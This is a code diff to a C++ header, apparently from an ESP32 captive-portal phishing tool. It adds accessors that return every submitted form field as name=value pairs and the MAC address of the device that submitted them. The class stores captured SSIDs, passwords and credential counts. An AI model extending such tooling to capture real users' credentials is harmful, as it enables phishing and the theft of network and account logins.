@@ -34,6 +34,12 @@ public:
     bool hasCredentials();
     String getCapturedSSID();
     String getCapturedPassword();
+    // Every submitted field as "name=value" pairs, unlike getCapturedPassword()
+    // which truncates each field name to three characters for the on-screen log.
+    String getCapturedData();
+    // MAC of the station that submitted the form, or "unknown" if the softAP
+    // never handed it a lease (see recordApClientLease()).
+    String getCapturedClientMac();
 
     DNSServer &getDNSServer() { return *dnsServer; }
     AsyncWebServer &getWebServer() { return webServer; }
@@ -75,6 +81,8 @@ private:
     FS *fsHtmlFile;
 
     String lastCred;
+    String lastCredData;
+    String lastClientMac = "unknown";
     int totalCapturedCredentials = 0;
     int previousTotalCapturedCredentials = -1;
     String capturedCredentialsHtml = "";
